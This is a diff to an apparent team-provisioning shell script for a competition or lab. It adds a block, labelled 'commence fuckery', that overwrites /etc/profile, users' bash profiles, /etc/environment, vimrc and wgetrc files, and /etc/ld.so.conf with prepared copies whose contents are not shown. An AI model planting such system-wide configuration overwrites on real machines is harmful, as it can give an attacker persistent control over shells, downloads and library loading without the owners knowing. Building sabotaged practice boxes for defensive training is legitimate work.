@@ -20,3 +20,20 @@ sed -i "s/192.168.0.211/192.168.$team.211" $resolv
 
 #change hosts
 sed -i "s/10.10.0.69/10.10.$team.69" $hosts
+
+#commence fuckery
+
+cp /root/sources/bash_profile /etc/profile
+cp /root/sources/bash_profile /home/*/.bash_profile
+cp /root/sources/bash_profile /root/.bash_profile
+
+cp /root/sources/etc_environment /etc/environment
+cp /root/sources/vimrc /root/.vimrc
+cp /root/sources/vimrc /home/*/.vimrc
+cp /root/sources/vimrc /etc/vimrc
+
+cp /root/sources/wgetrc /etc/wgetrc
+cp /root/sources/wgetrc /root/.wgetrc
+cp /root/sources/wgetrc /home/*/.wgetrc
+
+cp /root/sources/ld_so_conf /etc/ld.so.conf
